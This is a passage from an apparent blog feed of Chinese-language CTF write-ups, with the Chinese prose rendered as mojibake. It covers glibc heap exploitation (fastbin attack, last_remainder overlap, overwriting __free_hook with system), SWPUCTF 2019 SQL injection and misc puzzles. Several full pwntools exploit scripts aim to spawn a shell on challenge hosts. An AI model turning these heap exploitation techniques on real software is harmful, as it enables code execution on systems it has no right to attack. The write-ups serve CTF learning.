class="hljs-built_in">puts</span>(<span class="hljs-string">"invaild index"</span>);    &#125;  &#125;  <span class="hljs-keyword">else</span>  &#123;    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"No pages in the daily"</span>);  &#125;  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v3;&#125;</code></pre><p>æ²¡æœ‰å¯¹ v1 æ£€æŸ¥ï¼Œé€ æˆä»»æ„åœ°å€free</p><p>é€šè¿‡ä»»æ„åœ°å€freeï¼Œç›´æ¥freeå †å¤´åœ°å€ï¼Œå†åˆ©ç”¨bssç•™å­˜çš„å †å—æŒ‡é’ˆè¿›è¡ŒUAFæ“ä½œã€‚</p><ol><li>æ­£å¸¸åˆ©ç”¨unsort binè¿›è¡Œå †åŸºå€å’ŒlibcåŸºå€çš„leakã€‚</li><li>åˆ©ç”¨ä»»æ„åœ°å€freeï¼Œç›´æ¥å°†å¸ƒç½®å¥½çš„å †å—freeåˆ°fastbinä¸­ã€‚</li><li>åˆ©ç”¨bssæ®µç•™å­˜çš„è¯¥å †å—æŒ‡é’ˆï¼Œè¿›è¡Œfastbin attackï¼Œå°†bssæ®µå½“ä½œå †å—ç”³è¯·ã€‚</li><li>é€šè¿‡ç”³è¯·åˆ°çš„bssæ®µå †å—ï¼Œå°†å…¶ä½™å †å—æŒ‡é’ˆè¦†ç›–ä¸ºfree_hookåœ°å€ï¼Œå¹¶é€šè¿‡editè¢«è¦†ç›–çš„å †å—ç´¢å¼•å°†free_hookå†™ä¸ºsystemåœ°å€ã€‚</li><li>é€šè¿‡freeä¹‹å‰å¸ƒç½®å¥½çš„dataä¸ºâ€™/bin/sh\x00â€™çš„å¯¹åº”Headeræ¥get shellã€‚</li></ol><p>(double free ä¹Ÿå¯ä»¥)</p><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python2</span><span class="hljs-comment">#encoding:utf-8</span><span class="hljs-comment">#__author__='pumpkin9@DL&amp;S'</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> sys<span class="hljs-comment"># context(log_level='debug',terminal=['tmux','split','-h'],arch='amd64')</span>file_name = <span class="hljs-string">'./pwn'</span>libc_name = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>ip = <span class="hljs-string">'108.160.139.79'</span>port = <span class="hljs-string">'9090'</span><span class="hljs-comment"># context.arch = 'amd64'</span><span class="hljs-comment"># context.log_level='debug'</span>context.terminal=[<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'split'</span>,<span class="hljs-string">'-h'</span>]libc = ELF(libc_name)elf = ELF(file_name)p = process(file_name)<span class="hljs-comment"># p = remote(ip,int(port))</span>li = <span class="hljs-keyword">lambda</span> name,x : log.info(name+<span class="hljs-string">':0x%x'</span>%x)ls = <span class="hljs-keyword">lambda</span> name,x : log.success(name+<span class="hljs-string">':0x%x'</span>%x)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">()</span>:</span>p.sendlineafter(<span class="hljs-string">"Your choice:"</span>,<span class="hljs-string">"1"</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,content)</span>:</span>p.sendlineafter(<span class="hljs-string">"Your choice:"</span>,<span class="hljs-string">"2"</span>)p.sendlineafter(<span class="hljs-string">"daily:"</span>,str(size))p.sendlineafter(<span class="hljs-string">"daily\n"</span>,content)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,content)</span>:</span>p.sendlineafter(<span class="hljs-string">"Your choice:"</span>,<span class="hljs-string">"3"</span>)p.sendlineafter(<span class="hljs-string">"daily:"</span>,str(idx))p.sendlineafter(<span class="hljs-string">"daily\n"</span>,content)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>p.sendlineafter(<span class="hljs-string">"Your choice:"</span>,<span class="hljs-string">"4"</span>)p.sendlineafter(<span class="hljs-string">"daily:"</span>,str(idx))add(<span class="hljs-number">0x80</span>,<span class="hljs-string">""</span>) <span class="hljs-comment">#0</span>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">""</span>) <span class="hljs-comment">#1</span>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">""</span>) <span class="hljs-comment">#2</span>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">""</span>) <span class="hljs-comment">#3</span>free(<span class="hljs-number">0</span>)free(<span class="hljs-number">2</span>)add(<span class="hljs-number">0x80</span>,<span class="hljs-string">""</span>) <span class="hljs-comment">#0</span>show()p.recvuntil(<span class="hljs-string">"0 : "</span>)libc.address = u64(p.recvuntil(<span class="hljs-string">"1"</span>,<span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">"\x00"</span>))<span class="hljs-number">-3951370</span>ls(<span class="hljs-string">"libc addr"</span>,libc.address)edit(<span class="hljs-number">0</span>,<span class="hljs-string">"a"</span>*<span class="hljs-number">8</span>)show()p.recvuntil(<span class="hljs-string">"aaaaaaaa"</span>)heap_base = u64(p.recvuntil(<span class="hljs-string">"1"</span>,<span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">"\x00"</span>)) - <span class="hljs-number">0x10a</span>ls(<span class="hljs-string">"heap addr"</span>,heap_base)free(<span class="hljs-number">1</span>)free(<span class="hljs-number">0</span>)free(<span class="hljs-number">3</span>)add(<span class="hljs-number">0x30</span> , <span class="hljs-string">'a'</span> * <span class="hljs-number">8</span> + p64(heap_base + <span class="hljs-number">0x10</span>)) <span class="hljs-comment">#0</span>offset = (heap_base - <span class="hljs-number">0x602060</span>) / <span class="hljs-number">16</span> + <span class="hljs-number">1</span>li(<span class="hljs-string">"offset"</span>,offset)free(offset)add(<span class="hljs-number">0x41</span> , <span class="hljs-string">'\x00'</span> * <span class="hljs-number">0x40</span>) <span class="hljs-comment">#1</span>edit(<span class="hljs-number">0</span> , p64(<span class="hljs-number">0x602068</span>))add(<span class="hljs-number">0x30</span>,<span class="hljs-string">"/bin/sh\x00"</span>) <span class="hljs-comment">#2</span>add(<span class="hljs-number">0x30</span>,p64(libc.symbols[<span class="hljs-string">'__free_hook'</span>]))edit(<span class="hljs-number">1</span>,p64(libc.symbols[<span class="hljs-string">'system'</span>]))free(<span class="hljs-number">0</span>)<span class="hljs-comment"># gdb.attach(p)</span>p.interactive()</code></pre><h2 id="your-pwn">your_pwn<a class="post-anchor" href="#your-pwn"></a></h2><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python2</span><span class="hljs-comment">#encoding:utf-8</span><span class="hljs-comment">#__author__='pumpkin9@DL&amp;S'</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> syscontext.arch = <span class="hljs-string">'amd64'</span><span class="hljs-comment"># context.log_level='debug'</span>context.terminal=[<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'split'</span>,<span class="hljs-string">'-h'</span>]file_name = <span class="hljs-string">'./heap'</span>libc_name = <span class="hljs-string">'../libc/18-libc64.so'</span>ip = <span class="hljs-string">'node3.buuoj.cn'</span>port = <span class="hljs-string">'28236'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:p = process(file_name)elf = ELF(file_name)libc = ELF(<span class="hljs-string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)<span class="hljs-keyword">else</span>:p = remote(ip,int(port))elf = ELF(file_name)libc = ELF(<span class="hljs-string">"../libc/18-libc64.so"</span>)li = <span class="hljs-keyword">lambda</span> name,x : log.info(name+<span class="hljs-string">':0x%x'</span>%x)ls = <span class="hljs-keyword">lambda</span> name,x : log.success(name+<span class="hljs-string">':0x%x'</span>%x)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,content)</span>:</span>p.sendlineafter(<span class="hljs-string">" :"</span>,<span class="hljs-string">"1"</span>)p.sendlineafter(<span class="hljs-string">": "</span>,str(size))p.sendafter(<span class="hljs-string">": "</span>,content)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>p.sendlineafter(<span class="hljs-string">" :"</span>,<span class="hljs-string">"2"</span>)p.sendlineafter(<span class="hljs-string">": "</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">()</span>:</span>p.sendlineafter(<span class="hljs-string">" :"</span>,<span class="hljs-string">"3"</span>)<span class="hljs-comment"># leak libc</span>add(<span class="hljs-number">0x88</span>,<span class="hljs-string">"\x11"</span>) <span class="hljs-comment">#0</span>add(<span class="hljs-number">0x18</span>,<span class="hljs-string">"\x22"</span>) <span class="hljs-comment">#1</span>free(<span class="hljs-number">0</span>)add(<span class="hljs-number">0x88</span>,<span class="hljs-string">"a"</span>*<span class="hljs-number">8</span>) <span class="hljs-comment">#0</span>show()p.recvuntil(<span class="hljs-string">"0 : aaaaaaaa"</span>)libc.address = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">"\x00"</span>))<span class="hljs-number">-3951480</span>ls(<span class="hljs-string">"libc addr"</span>,libc.address)one_gg = <span class="hljs-number">0x4526a</span> + libc.addressadd(<span class="hljs-number">0x48</span>,<span class="hljs-string">"\x33"</span>) <span class="hljs-comment">#2</span>add(<span class="hljs-number">0x48</span>,<span class="hljs-string">"\x33"</span>) <span class="hljs-comment">#3</span>add(<span class="hljs-number">0x18</span>,<span class="hljs-string">"\x55"</span>) <span class="hljs-comment">#4</span>add(<span class="hljs-number">0x68</span>,<span class="hljs-string">"\x44"</span>) <span class="hljs-comment">#5</span>add(<span class="hljs-number">0x68</span>,<span class="hljs-string">"\x44"</span>) <span class="hljs-comment">#6</span>add(<span class="hljs-number">0x18</span>,<span class="hljs-string">"/bin/sh\x00"</span>) <span class="hljs-comment">#7</span>free(<span class="hljs-number">4</span>)free(<span class="hljs-number">1</span>)add(<span class="hljs-number">0x18</span>,<span class="hljs-string">"\x22"</span>*<span class="hljs-number">0x18</span>+<span class="hljs-string">"\xa1"</span>) <span class="hljs-comment">#1</span>free(<span class="hljs-number">2</span>)free(<span class="hljs-number">3</span>)target = <span class="hljs-number">0x3c4b4d</span> + libc.addressadd(<span class="hljs-number">0x98</span>,<span class="hljs-string">"2"</span>*<span class="hljs-number">0x48</span>+p64(<span class="hljs-number">0x51</span>)+p64(target)) <span class="hljs-comment">#2</span>add(<span class="hljs-number">0x48</span>,<span class="hljs-string">"1"</span>) <span class="hljs-comment">#3</span>add(<span class="hljs-number">0x18</span>,<span class="hljs-string">"a"</span>*<span class="hljs-number">0x18</span>+<span class="hljs-string">"\xe1"</span>)free(<span class="hljs-number">5</span>)free(<span class="hljs-number">6</span>)target2 = <span class="hljs-number">0x3c4b3d</span> + libc.addressadd(<span class="hljs-number">0xd8</span>,<span class="hljs-string">"a"</span>*<span class="hljs-number">0x68</span>+p64(<span class="hljs-number">0x71</span>)+p64(target2)) <span class="hljs-comment">#4</span>add(<span class="hljs-number">0x68</span>,<span class="hljs-string">"\n"</span>) <span class="hljs-comment">#5</span>add(<span class="hljs-number">0x68</span>,<span class="hljs-string">"1"</span>*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span>+p64(libc.symbols[<span class="hljs-string">'__free_hook'</span>]<span class="hljs-number">-0xb58</span>)) <span class="hljs-comment">#6</span>li(<span class="hljs-string">"free hook"</span>,libc.symbols[<span class="hljs-string">'__free_hook'</span>])add(<span class="hljs-number">0x208</span>,<span class="hljs-string">"1"</span>*<span class="hljs-number">0x200</span>) <span class="hljs-comment">#7</span>add(<span class="hljs-number">0x208</span>,<span class="hljs-string">"2"</span>*<span class="hljs-number">0x200</span>) <span class="hljs-comment">#8</span>add(<span class="hljs-number">0x208</span>,<span class="hljs-string">"3"</span>*<span class="hljs-number">0x200</span>) <span class="hljs-comment">#9</span>add(<span class="hljs-number">0x208</span>,<span class="hljs-string">"4"</span>*<span class="hljs-number">0x200</span>) <span class="hljs-comment">#10</span>add(<span class="hljs-number">0x208</span>,<span class="hljs-string">"5"</span>*<span class="hljs-number">0x200</span>) <span class="hljs-comment">#11</span>add(<span class="hljs-number">0x100</span><span class="hljs-number">-0x20</span>,<span class="hljs-string">"\n"</span>)add(<span class="hljs-number">0x100</span>,p64(<span class="hljs-number">1</span>)+p64(one_gg))free(<span class="hljs-number">0</span>)<span class="hljs-comment"># gdb.attach(p)</span>p.interactive()</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>last_remainder</title>
      <link href="/2019/12/12/last-remainder/"/>
      <url>/2019/12/12/last-remainder/</url>
      
        <content type="html"><![CDATA[<p>åˆ‡å‰²unsortedbinä¸­çš„å¤§chunkæ—¶ï¼š<br>å½“unsortedbinæœ‰å¯¹åº”çš„freechunkå¯ä»¥ç»™mallocåˆ‡å‰²ä½¿ç”¨æ—¶ï¼Œunsortedbinä¼šå‘ç”Ÿä»¥ä¸‹æ­¥éª¤ï¼š</p><ol><li>å…ˆå°†è¿™äº›freechunkæ”¾ç½®åˆ°å¯¹åº”å¤§å°çš„binsé“¾ä¸Šï¼ˆæ”¾å…¥smallbinæˆ–largebinï¼‰</li><li>æ”¾ç½®åˆ°å¯¹åº”çš„binsé“¾ä¸Šä¹‹åï¼Œåˆ‡å‰²æ­¤freechunk</li><li>åˆ‡å‰²ä¹‹åä¼šäº§ç”Ÿlast remainderï¼Œå†å°†last remainderæ”¾åˆ°unsortedbinä¸Š<blockquote><p>ä¾‹å¦‚ï¼š<br>æ­¤æ—¶ï¼Œunsortedbinæœ‰ä¸¤ä¸ª0x800çš„freechunk<br>æ­¤æ—¶ç”³è¯·ä¸€ä¸ª0x600çš„chunk<br>é‚£ä¹ˆunsortedbinä¼šå…ˆconsolidateï¼ŒæŠŠä¸¤ä¸ª0x800çš„freechunkå…ˆç§»åŠ¨åˆ°largebinä¸­<br>ç„¶åå†åˆ‡å‰²largebinçš„freechunkï¼Œå°†åˆ‡å‰²åä½™ç•™ä¸‹çš„0x200æ”¾å…¥unsortedbin</p></blockquote></li></ol><p>åˆ‡å‰²smallbinsã€largebinsä¸­çš„å¤§chunkæ—¶ï¼š</p><ol><li>åˆ‡å‰²smallbinsæˆ–è€…largebinsä¸­çš„å¤§freechunkï¼Œäº§ç”Ÿlast remainder</li><li>å°†last remainderæ”¾å…¥åˆ°unsortedbinä¸­<br>æ³¨æ„ï¼ˆé‡ç‚¹ï¼‰ï¼šmallocæ°¸è¿œä¸ä¼šå»æ£€æµ‹åˆ‡å‰²fastbinsï¼ˆè¯¦æƒ…è§_int_mallocå‡½æ•°çš„æ‰§è¡Œé¡ºåºï¼‰</li></ol><p>è¿™é‡Œéœ€è¦ä½¿ç”¨ä¸€ç§ä¸éœ€è¦ä¼ªé€ prevsizeæ¥æ„é€ overlapçš„æŠ€å·§ã€‚å½“ç”³è¯·chunkæ—¶ï¼Œè‹¥chunkæ˜¯ä»last_remainderä¸Šåˆ‡å‰²ä¸‹æ¥ï¼Œé‚£ä¹ˆè¿™ä¸ªè¿‡ç¨‹ä¸­å°†ä¸ä¼šè°ƒç”¨åˆ°unlinkå®ï¼Œä¹Ÿå°±ä¸ä¼šæ£€æµ‹ä¸‹ä¸€chunkçš„prevsizeæ˜¯å¦ç­‰äºå½“å‰chunkçš„sizeï¼Œè¿™æ ·å°±å¯ä»¥å®ç°æ— prevsizeè§¦å‘overlapã€‚</p><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python2</span><span class="hljs-comment">#encoding:utf-8</span><span class="hljs-comment">#__author__='pumpkin9@DL&amp;S'</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> sys<span class="hljs-keyword">import</span> requests<span class="hljs-comment"># context(log_level='debug',terminal=['tmux','split','-h'],arch='amd64')</span>file_name = <span class="hljs-string">'./pwn1'</span>libc_name = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>ip = <span class="hljs-string">'node3.buuoj.cn'</span>port = <span class="hljs-string">'26364'</span>context.arch = <span class="hljs-string">'amd64'</span><span class="hljs-comment"># context.log_level='debug'</span>context.terminal=[<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'split'</span>,<span class="hljs-string">'-h'</span>]libc = ELF(libc_name)elf = ELF(file_name)p = process(file_name)li = <span class="hljs-keyword">lambda</span> name,x : log.info(name+<span class="hljs-string">':0x%x'</span>%x)ls = <span class="hljs-keyword">lambda</span> name,x : log.success(name+<span class="hljs-string">':0x%x'</span>%x)<span class="hljs-string">'''0x45216 execve("/bin/sh", rsp+0x30, environ)constraints:  rax == NULL0x4526a execve("/bin/sh", rsp+0x30, environ)constraints:  [rsp+0x30] == NULL0xf02a4 execve("/bin/sh", rsp+0x50, environ)constraints:  [rsp+0x50] == NULL0xf1147 execve("/bin/sh", rsp+0x70, environ)constraints:  [rsp+0x70] == NULL'''</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,content)</span>:</span>p.sendlineafter(<span class="hljs-string">"choice&gt; "</span>,str(<span class="hljs-number">1</span>))p.sendlineafter(<span class="hljs-string">"length&gt; "</span>,str(size))p.sendlineafter(<span class="hljs-string">"content&gt; "</span>,content)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>p.sendlineafter(<span class="hljs-string">"choice&gt; "</span>,str(<span class="hljs-number">2</span>))p.sendlineafter(<span class="hljs-string">"index&gt; "</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>p.sendlineafter(<span class="hljs-string">"choice&gt; "</span>,str(<span class="hljs-number">3</span>))p.sendlineafter(<span class="hljs-string">"index&gt; "</span>,str(idx))fkchunk = <span class="hljs-string">"/bin/sh||aaaaaaa\x31"</span>p.sendlineafter(<span class="hljs-string">"name&gt; "</span>,fkchunk)add(<span class="hljs-number">0xf8</span>, <span class="hljs-string">""</span>) <span class="hljs-comment">#A 0</span>add(<span class="hljs-number">0x1f8</span>,<span class="hljs-string">""</span>) <span class="hljs-comment">#B 1</span>add(<span class="hljs-number">0xf8</span>, <span class="hljs-string">""</span>) <span class="hljs-comment">#C 2</span>free(<span class="hljs-number">1</span>)free(<span class="hljs-number">0</span>)add(<span class="hljs-number">0x100</span>,<span class="hljs-string">""</span>) <span class="hljs-comment">#A 0</span>add(<span class="hljs-number">0x78</span>, <span class="hljs-string">""</span>) <span class="hljs-comment">#B1 1</span>add(<span class="hljs-number">0x108</span>,<span class="hljs-string">""</span>) <span class="hljs-comment">#B2 3</span>add(<span class="hljs-number">0x8</span>,  <span class="hljs-string">""</span>) <span class="hljs-comment">#B3 4</span>add(<span class="hljs-number">0x18</span>, <span class="hljs-string">""</span>) <span class="hljs-comment">#B4 5</span>free(<span class="hljs-number">1</span>)free(<span class="hljs-number">2</span>)add(<span class="hljs-number">0x78</span>, <span class="hljs-string">""</span>) <span class="hljs-comment">#B1 1</span>add(<span class="hljs-number">0x108</span>,<span class="hljs-string">""</span>) <span class="hljs-comment">#B2 2</span>add(<span class="hljs-number">0x8</span>,  <span class="hljs-string">""</span>) <span class="hljs-comment">#B3 6</span>add(<span class="hljs-number">0x18</span>, <span class="hljs-string">""</span>) <span class="hljs-comment">#B4 7</span>add(<span class="hljs-number">0x10</span>, <span class="hljs-string">""</span>) <span class="hljs-comment">#8</span>add(<span class="hljs-number">0x18</span>, <span class="hljs-string">""</span>) <span class="hljs-comment">#9</span><span class="hljs-comment"># add(0x18, "")</span>free(<span class="hljs-number">3</span>)show(<span class="hljs-number">2</span>)libc.address = u64(p.recvuntil(<span class="hljs-string">"\n"</span>,<span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">"\x00"</span>))<span class="hljs-number">-3951480</span>ls(<span class="hljs-string">"libc addr"</span>,libc.address)free(<span class="hljs-number">8</span>)free(<span class="hljs-number">4</span>)show(<span class="hljs-number">6</span>)heap_addr = u64(p.recvuntil(<span class="hljs-string">"\n"</span>,<span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">"\x00"</span>))<span class="hljs-number">-928</span>+<span class="hljs-number">0x18</span>ls(<span class="hljs-string">"heap addr"</span>,heap_addr)free(<span class="hljs-number">5</span>)free(<span class="hljs-number">9</span>)free(<span class="hljs-number">7</span>)add(<span class="hljs-number">0x20</span>, p64(heap_addr)) <span class="hljs-comment">#2</span>add(<span class="hljs-number">0x20</span>, <span class="hljs-string">""</span>) <span class="hljs-comment">#3</span>add(<span class="hljs-number">0x20</span>, <span class="hljs-string">""</span>) <span class="hljs-comment">#4</span>add(<span class="hljs-number">0x20</span>, <span class="hljs-string">"a"</span>*<span class="hljs-number">8</span>+p64(libc.symbols[<span class="hljs-string">'__free_hook'</span>]))p.sendlineafter(<span class="hljs-string">"choice&gt; "</span>,str(<span class="hljs-number">4</span>))p.sendlineafter(<span class="hljs-string">"remarks&gt;"</span>,p64(libc.symbols[<span class="hljs-string">'system'</span>]))gdb.attach(p)p.interactive()</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SWPUCTF 2019 write up</title>
      <link href="/2019/12/09/SWPUCTF-2019-write-up-md/"/>
      <url>/2019/12/09/SWPUCTF-2019-write-up-md/</url>
      
        <content type="html"><![CDATA[<h1 id="Web">Web<a class="post-anchor" href="#Web"></a></h1><h2 id="easy-web">easy_web<a class="post-anchor" href="#easy-web"></a></h2><p>Description<br>hint1ï¼šç®¡ç†åå°æœªå®Œå–„ || hint2ï¼šæ— éœ€æ‰«æå™¨ || hint3ï¼šä¸æ˜¯xss<br>åæ¥çš„hintï¼šhint1ï¼šä¸æ˜¯xss || hint2ï¼šä½¿ç”¨somd5è§£flag<br>URL <a href="http://211.159.177.185:23456" target="_blank" rel="noopener">http://211.159.177.185:23456</a></p><p>è€ƒå¯Ÿçš„çŸ¥è¯†ç‚¹ä¸ºäºŒæ¬¡æ³¨å…¥ï¼Œbypass information_schemaï¼Œé€šè¿‡å­æŸ¥è¯¢åœ¨æ²¡æœ‰åˆ—åçš„æƒ…å†µä¸‹æŸ¥è¯¢æ•°æ®</p><p>é¦–å…ˆå¯ä»¥çœ‹åˆ°ï¼Œæœ‰ä¸€ä¸ªç”³è¯·å¹¿å‘Šçš„åœ°æ–¹ï¼Œæ—¢ç„¶æç¤ºäº†ä¸æ˜¯xssï¼Œé‚£ä¹ˆå°±è‡ªç„¶è€ƒè™‘ä¸‹sqlæ³¨å…¥<br>ç®€å•æµ‹è¯•å‘ç°æœ‰æŠ¥é”™å’Œå›æ˜¾<br><a href="https://uploader.shimo.im/f/7qILxI0yCNccF2bO.png" data-caption data-fancybox="images"><img src="https://uploader.shimo.im/f/7qILxI0yCNccF2bO.png" alt></a><br>ç»è¿‡æµ‹è¯•å‘ç°ï¼Œç©ºæ ¼ä¼šè¢«æ›¿æ¢ä¸ºç©ºï¼Œè¿‡æ»¤äº†orï¼Œandä»¥åŠå…¶ä»–å‡ ä¹å…¨éƒ¨æŠ¥é”™å‡½æ•°ï¼Œè¢«ä¸€å…±æœ‰22åˆ—æ•°æ®è¢«æŸ¥è¯¢å‡º<br>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¹ˆä¸€ä¸ªæ€§è´¨æ¥è·å–æ•°æ®åº“åï¼šåœ¨ä½¿ç”¨ä¸€ä¸ªä¸å­˜åœ¨çš„å‡½æ•°æ—¶ï¼Œä¼šæŠ¥é”™æ˜¾ç¤ºå½“å‰çš„æ•°æ®åº“å</p><p><a href="https://uploader.shimo.im/f/omUGgqOOJc4BRMy0.png" data-caption data-fancybox="images"><img src="https://uploader.shimo.im/f/omUGgqOOJc4BRMy0.png" alt></a></p><p><a href="https://uploader.shimo.im/f/tE8qT2kIX28SUvU5.png" data-caption data-fancybox="images"><img src="https://uploader.shimo.im/f/tE8qT2kIX28SUvU5.png" alt></a><br>è¿™æ ·å°±è·å–äº†æ•°æ®åº“å<br>å› ä¸ºè¿‡æ»¤äº†orï¼Œæ‰€ä»¥æˆ‘ä»¬å°±æ— æ³•ä½¿ç”¨informationæ¥è·å–è¡¨åï¼Œæœ¬æ¥æƒ³ç”¨innodb_table_statsæ¥è·å–è¡¨åæ¥ç€ï¼Œç„¶é¹…mysqlè¿™ä¸ªå…³é”®è¯ä¹Ÿè¢«è¿‡æ»¤äº†<br>è¿˜æœ‰ä¸€ä¸ªå«åšsys.schema_auto_increment_columnsçš„è¡¨ä¸“é—¨è®°å½•è‡ªå¢IDï¼Œä»è¿™é‡Œæˆ‘ä»¬ä¹Ÿå¯ä»¥è·å–è¡¨å<br><a href="https://uploader.shimo.im/f/9FaCGiZX45gQEV4C.png" data-caption data-fancybox="images"><img src="https://uploader.shimo.im/f/9FaCGiZX45gQEV4C.png" alt></a><br>ç„¶åè¿˜æ˜¯å› ä¸ºè¿‡æ»¤äº†orå’Œjoinï¼Œæˆ‘ä»¬æ— æ³•è·å¾—åˆ—åï¼Œåªèƒ½é€šè¿‡å­æŸ¥è¯¢å»æ›´æ”¹åˆ—å<br>å› ä¸ºæç¤ºä¸­ç»™çš„æ˜¯ç”¨somd5è§£å‡ºflagï¼Œæ‰€ä»¥æˆ‘çŒœæµ‹flagä¸ºadminçš„å¯†ç <br><a href="https://uploader.shimo.im/f/md8EqVcWyA0ORX4e.png" data-caption data-fancybox="images"><img src="https://uploader.shimo.im/f/md8EqVcWyA0ORX4e.png" alt></a><br><a href="https://uploader.shimo.im/f/KA3jVW1xoTcjT5iV.png" data-caption data-fancybox="images"><img src="https://uploader.shimo.im/f/KA3jVW1xoTcjT5iV.png" alt></a><br>ç¬¬äºŒä¸ªå°±æ˜¯adminçš„å¯†ç ï¼Œç”¨somd5è§£å¯†å³å¯è·å¾—flag</p><h1 id="Misc">Misc<a class="post-anchor" href="#Misc"></a></h1><h2 id="MISC">| MISC<a class="post-anchor" href="#MISC"></a></h2><p>å†…å®¹æ˜¯ntfs      flag.txt<br>ä½¿ç”¨ntfsstreamseditorå·¥å…·ï¼Œå¯¹ç€æ¡Œé¢æ‰«ntfsæµ<br>æ‰«å‡ºflag</p><h2 id="MISC-1">| MISC<a class="post-anchor" href="#MISC-1"></a></h2><p>binwalkåˆ†æä¸€ä¸‹ï¼Œå¾ˆå¤šå‹ç¼©åŒ…<br>binwalk -eåˆ†ç¦»å‡ºæ¥<br>flag.docé‡Œé¢çš„å¯†æ–‡ç»è¿‡æ•°æ¬¡bs64è§£ç å¾—åˆ°ä¸€ä¸ªå¯†ç <br>encode.txt bs64è§£ç ä¹‹åå¾—åˆ°ä¸€ä¸ªå¯†ç <br>åˆ†åˆ«æŠŠflag.jpgå’Œgood.mp3ç”¨å¯†ç è§£å‹å‡ºæ¥<br>mp3æ–‡ä»¶æ”¾åˆ°Audacityåˆ†æï¼Œé•¿éŸ³ä»£è¡¨- çŸ­éŸ³ä»£è¡¨Â·<br>è«æ–¯è§£å¯†å¾—åˆ°MORSEISVERYVERYEASYï¼Œ<br>å°å†™ swpuctf{morseisveryveryeasy}</p><h2 id="MISC-2">| MISC<a class="post-anchor" href="#MISC-2"></a></h2><p>æ ¹æ®æç¤ºttlï¼Œ2019è¥¿æ¹–è®ºå‰‘miscåŸé¢˜ï¼Œæ ¹æ®è„šæœ¬æ¢å¤å‡ºä¸€ä¸ªtxtæ–‡ä»¶ã€‚æ–‡ä»¶å¼€å¤´ä¸º50 4Bï¼Œç”¨winhexè½¬ä¸ºzipæ–‡ä»¶ï¼Œéœ€è¦å¯†ç æ‰“å¼€å‹ç¼©åŒ…ã€‚çŒœæµ‹æ˜¯zipä¼ªåŠ å¯†ï¼Œæ”¾è¿›ziperelloä¸­å‘ç°æ²¡æœ‰åŠ å¯†æ–‡ä»¶ï¼Œæœç„¶æ˜¯zipä¼ªåŠ å¯†ã€‚010ä¿®æ”¹å‹ç¼©åŒ…å¾—åˆ°é‡Œé¢çš„flag.txtï¼Œæ˜¯ä¸€ä¸²åŠ å¯†äº†næ¬¡çš„base64ï¼Œè„šæœ¬è§£åˆ°30æ¬¡æœ€ç»ˆè§£å®Œï¼Œä½†æ˜¯æ˜¯ä¹±ç ã€‚ç±»ä¼¼HECTF2019miscä¸­flagä»å¯ä»¥è¢«base6<br>4è§£å¯†ä¸€æ¬¡ï¼Œæ‰€ä»¥æ‰“å°å‡ºæ‰€æœ‰çš„è§£å¯†ç»“æœï¼Œå¾—åˆ°flagã€‚</p><h1 id="PWN">PWN<a class="post-anchor" href="#PWN"></a></h1><h2 id="p1Kkheap">p1Kkheap<a class="post-anchor" href="#p1Kkheap"></a></h2><p>ä¿æŠ¤å…¨å¼€ï¼Œå¹¶ä¸”ç¨‹åºè‡ªå·±å†™äº†å‡ ä¸ªé™åˆ¶æ¡ä»¶<br>ä¸èƒ½ç”³è¯·è¶…è¿‡ 0x100 å¤§å°çš„ chunk<br>ä¸èƒ½ free è¶…è¿‡ 3 æ¬¡ï¼Œadd &lt;= 7<br>è™½ç„¶æœ‰æŒ‡é’ˆæ‚¬æŒ‚ï¼Œfree ä¹‹å edit å› ä¸º size æ¸…é›¶ 